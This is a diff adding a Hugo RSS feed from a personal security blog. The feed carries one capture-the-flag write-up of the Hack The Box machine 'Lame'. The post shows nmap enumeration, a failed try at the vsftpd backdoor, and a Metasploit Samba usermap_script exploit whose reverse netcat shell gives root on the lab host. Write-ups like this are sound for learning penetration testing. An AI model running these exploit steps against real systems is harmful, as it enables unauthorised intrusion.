@@ -1,0 +1,96 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>smb on Mdn1nj4</title>
+    <link>https://mdninja.ml/tags/smb/</link>
+    <description>Recent content in smb on Mdn1nj4</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <copyright>Copyright © 2020–2021, all rights reserved.</copyright>
+    <lastBuildDate>Wed, 17 Mar 2021 19:41:08 +0530</lastBuildDate><atom:link href="https://mdninja.ml/tags/smb/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Lame Writeup</title>
+      <link>https://mdninja.ml/post/lame_htb/</link>
+      <pubDate>Wed, 17 Mar 2021 19:41:08 +0530</pubDate>
+      
+      <guid>https://mdninja.ml/post/lame_htb/</guid>
+      <description>
+        
+          &lt;h2 id=&#34;__introduction__&#34;&gt;&lt;strong&gt;Introduction&lt;/strong&gt;&lt;/h2&gt;
+&lt;p&gt;Lame is easy level beginner machine, Basic enumuration and exploiting the samba service which run the vuln version with RCE.&lt;/p&gt;
+&lt;h2 id=&#34;__enumuration__&#34;&gt;&lt;strong&gt;Enumuration&lt;/strong&gt;&lt;/h2&gt;
+&lt;p&gt;Always start with the common ports scanning for the open ports.I alwaysuse nmap to scan for the open ports.Nmap reveals the open ports.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span class=&#34;ln&#34;&gt; 1&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#nmap -sV -oN lame.nmap 10.10.10.3 -Pn&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt; 2&lt;/span&gt;Host discovery disabled &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;-Pn&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;. All addresses will be marked &lt;span class=&#34;s1&#34;&gt;&amp;#39;up&amp;#39;&lt;/span&gt; and scan &lt;span class=&#34;nb&#34;&gt;times&lt;/span&gt; will be slower.
+&lt;span class=&#34;ln&#34;&gt; 3&lt;/span&gt;Starting Nmap 7.91 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2021-03-17 03:46 GMT
+&lt;span class=&#34;ln&#34;&gt; 4&lt;/span&gt;Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.3
+&lt;span class=&#34;ln&#34;&gt; 5&lt;/span&gt;Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.13s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+&lt;span class=&#34;ln&#34;&gt; 6&lt;/span&gt;Not shown: &lt;span class=&#34;m&#34;&gt;996&lt;/span&gt; filtered ports
+&lt;span class=&#34;ln&#34;&gt; 7&lt;/span&gt;PORT    STATE SERVICE     VERSION
+&lt;span class=&#34;ln&#34;&gt; 8&lt;/span&gt;21/tcp  open  ftp         vsftpd 2.3.4
+&lt;span class=&#34;ln&#34;&gt; 9&lt;/span&gt;22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;10&lt;/span&gt;139/tcp open  netbios-ssn Samba smbd 3.X - 4.X &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;11&lt;/span&gt;445/tcp open  netbios-ssn Samba smbd 3.X - 4.X &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;12&lt;/span&gt;Service Info: OSs: Unix, Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+&lt;span class=&#34;ln&#34;&gt;13&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;14&lt;/span&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+&lt;span class=&#34;ln&#34;&gt;15&lt;/span&gt;Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; IP address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host up&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; scanned in 32.51 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;__21---ftp__-_exploit-failed_&#34;&gt;&lt;strong&gt;21 - FTP&lt;/strong&gt; (&lt;em&gt;Exploit Failed&lt;/em&gt;)&lt;/h2&gt;
+&lt;p&gt;I do some googling for is there any exploit available for the ftp version and i got the RCE exploit for the vsftpd service but it seems to be not worked for me.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span class=&#34;ln&#34;&gt;1&lt;/span&gt;telnet 10.10.10.3 &lt;span class=&#34;m&#34;&gt;21&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;2&lt;/span&gt;Trying 10.10.10.3...
+&lt;span class=&#34;ln&#34;&gt;3&lt;/span&gt;Connected to 10.10.10.3.
+&lt;span class=&#34;ln&#34;&gt;4&lt;/span&gt;Escape character is &lt;span class=&#34;s1&#34;&gt;&amp;#39;^]&amp;#39;&lt;/span&gt;.
+&lt;span class=&#34;ln&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;220&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;vsFTPd 2.3.4&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;6&lt;/span&gt;USER user:&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;331&lt;/span&gt; Please specify the password.
+&lt;span class=&#34;ln&#34;&gt;8&lt;/span&gt;PASS pass
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span class=&#34;ln&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#nc 10.10.10.3 6200&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;2&lt;/span&gt;id
+&lt;span class=&#34;ln&#34;&gt;3&lt;/span&gt;whoami
+&lt;span class=&#34;ln&#34;&gt;4&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;#does not work&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;__exploitation__&#34;&gt;&lt;strong&gt;Exploitation&lt;/strong&gt;&lt;/h2&gt;
+&lt;p&gt;FTP is not a way to get this machine. So i moved to the samba service which is run in the lame machine. The version of the samba server seems to be exploitable ,Because it was outdated version so i hope there is some exploit available for the version.
+&lt;img src=&#34;&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;__samba-user-name-map-script__&#34;&gt;&lt;strong&gt;Samba user name map script&lt;/strong&gt;&lt;/h2&gt;
+&lt;p&gt;I found the exploit for the samba in searchsploit.There is exploit available in metasploit&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;ln&#34;&gt; 1&lt;/span&gt;$searchsploit samba 3.0
+&lt;span class=&#34;ln&#34;&gt; 2&lt;/span&gt;----------------------------------------------------------------------------------------------------- ---------------------------------
+&lt;span class=&#34;ln&#34;&gt; 3&lt;/span&gt; Exploit Title                                                                                       |  Path
+&lt;span class=&#34;ln&#34;&gt; 4&lt;/span&gt;----------------------------------------------------------------------------------------------------- ---------------------------------
+&lt;span class=&#34;ln&#34;&gt; 5&lt;/span&gt;Samba 3.0.10 (OSX) - &amp;#39;lsa_io_trans_names&amp;#39; Heap Overflow (Metasploit)                                 | osx/remote/16875.rb
+&lt;span class=&#34;ln&#34;&gt; 6&lt;/span&gt;Samba 3.0.10 &amp;lt; 3.3.5 - Format String / Security Bypass                                               | multiple/remote/10095.txt
+&lt;span class=&#34;ln&#34;&gt; 7&lt;/span&gt;Samba 3.0.20 &amp;lt; 3.0.25rc3 - &amp;#39;Username&amp;#39; map script&amp;#39; Command Execution (Metasploit)                     | unix/remote/16320.rb
+&lt;span class=&#34;ln&#34;&gt; 8&lt;/span&gt;Samba 3.0.21 &amp;lt; 3.0.24 - LSA trans names Heap Overflow (Metasploit)                                   | linux/remote/9950.rb
+&lt;span class=&#34;ln&#34;&gt; 9&lt;/span&gt;Samba 3.0.24 (Linux) - &amp;#39;lsa_io_trans_names&amp;#39; Heap Overflow (Metasploit)                               | linux/remote/16859.rb
+&lt;span class=&#34;ln&#34;&gt;10&lt;/span&gt;Samba 3.0.24 (Solaris) - &amp;#39;lsa_io_trans_names&amp;#39; Heap Overflow (Metasploit)                             | solaris/remote/16329.rb
+&lt;span class=&#34;ln&#34;&gt;11&lt;/span&gt;Samba 3.0.27a - &amp;#39;send_mailslot()&amp;#39; Remote Buffer Overflow                                             | linux/dos/4732.c
+&lt;span class=&#34;ln&#34;&gt;12&lt;/span&gt;Samba 3.0.29 (Client) - &amp;#39;receive_smb_raw()&amp;#39; Buffer Overflow (PoC)                                    | multiple/dos/5712.pl
+&lt;span class=&#34;ln&#34;&gt;13&lt;/span&gt;Samba 3.0.4 - SWAT Authorisation Buffer Overflow                                                     | linux/remote/364.pl
+&lt;span class=&#34;ln&#34;&gt;14&lt;/span&gt;Samba &amp;lt; 3.0.20 - Remote Heap Overflow                                                                | linux/remote/7701.txt
+&lt;span class=&#34;ln&#34;&gt;15&lt;/span&gt;Samba &amp;lt; 3.0.20 - Remote Heap Overflow                                                                | linux/remote/7701.txt
+&lt;span class=&#34;ln&#34;&gt;16&lt;/span&gt;Samba &amp;lt; 3.6.2 (x86) - Denial of Service (PoC)                                                        | linux_x86/dos/36741.py
+&lt;span class=&#34;ln&#34;&gt;17&lt;/span&gt;----------------------------------------------------------------------------------------------------- ---------------------------------
+&lt;span class=&#34;ln&#34;&gt;18&lt;/span&gt;Shellcodes: No Results
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;so i used it.  &lt;a href=&#34;https://amriunix.com/post/cve-2007-2447-samba-usermap-script/&#34;&gt;reference link&lt;/a&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span class=&#34;ln&#34;&gt; 1&lt;/span&gt;msf6 &amp;gt; use multi/samba/usermap_script
+&lt;span class=&#34;ln&#34;&gt; 2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; No payload configured, defaulting to cmd/unix/reverse_netcat
+&lt;span class=&#34;ln&#34;&gt; 3&lt;/span&gt;msf6 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/samba/usermap_script&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; rhost 10.10.10.3
+&lt;span class=&#34;ln&#34;&gt; 4&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;rhost&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; 10.10.10.3
+&lt;span class=&#34;ln&#34;&gt; 5&lt;/span&gt;msf6 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/samba/usermap_script&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; lhost 10.10.14.4
+&lt;span class=&#34;ln&#34;&gt; 6&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;lhost&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; 10.10.14.4
+&lt;span class=&#34;ln&#34;&gt; 7&lt;/span&gt;msf6 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/samba/usermap_script&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; exploit
+&lt;span class=&#34;ln&#34;&gt; 8&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt; 9&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Started reverse TCP handler on 10.10.14.4:4444 
+&lt;span class=&#34;ln&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Command shell session &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; opened &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.14.4:4444 -&amp;gt; 10.10.10.3:33415&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2021-03-17 04:00:50 +0000
+&lt;span class=&#34;ln&#34;&gt;11&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;12&lt;/span&gt;id
+&lt;span class=&#34;ln&#34;&gt;13&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;gid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;14&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;&lt;center&gt;#Rooted this machine.&lt;/center&gt;&lt;/strong&gt;&lt;/p&gt;
+
+        
+      </description>
+    </item>
+    
+  </channel>
+</rss>
